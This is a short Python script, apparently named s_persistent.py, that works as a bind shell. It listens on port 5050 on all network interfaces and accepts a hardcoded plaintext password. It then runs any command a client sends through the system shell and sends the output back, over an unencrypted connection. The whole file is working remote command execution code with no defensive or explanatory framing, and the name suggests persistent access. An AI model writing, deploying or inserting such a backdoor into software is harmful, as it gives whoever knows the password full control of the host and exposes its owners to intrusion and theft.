# s_persistent.py
import socket
import subprocess
import struct
import threading

HOST = "0.0.0.0"
PORT = 5050
PASSWORD = "secret123"

def recv_exact(conn, size):
    data = b""
    while len(data) < size:
        chunk = conn.recv(size - len(data))
        if not chunk:
            return None
        data += chunk
    return data

def handle_client(conn, addr):
    print(f"[+] Connected by {addr}")

    # Auth
    pw = conn.recv(1024).decode().strip()
    if pw != PASSWORD:
        conn.sendall(b"AUTH FAILED")
        conn.close()
        return

    conn.sendall(b"AUTH OK")

    while True:
        raw_len = recv_exact(conn, 4)
        if not raw_len:
            break

        cmd_len = struct.unpack("!I", raw_len)[0]
        cmd = recv_exact(conn, cmd_len).decode().strip()

        if cmd.lower() == "exit":
            break

        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output

        if not output:
            output = b"[no output]\n"

        conn.sendall(struct.pack("!I", len(output)))
        conn.sendall(output)

    conn.close()
    print(f"[-] Disconnected {addr}")

# Main server loop
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((HOST, PORT))
server.listen(5)
print(f"[+] Server listening on {HOST}:{PORT}")

while True:
    conn, addr = server.accept()
    t = threading.Thread(target=handle_client, args=(conn, addr))
    t.daemon = True
    t.start()
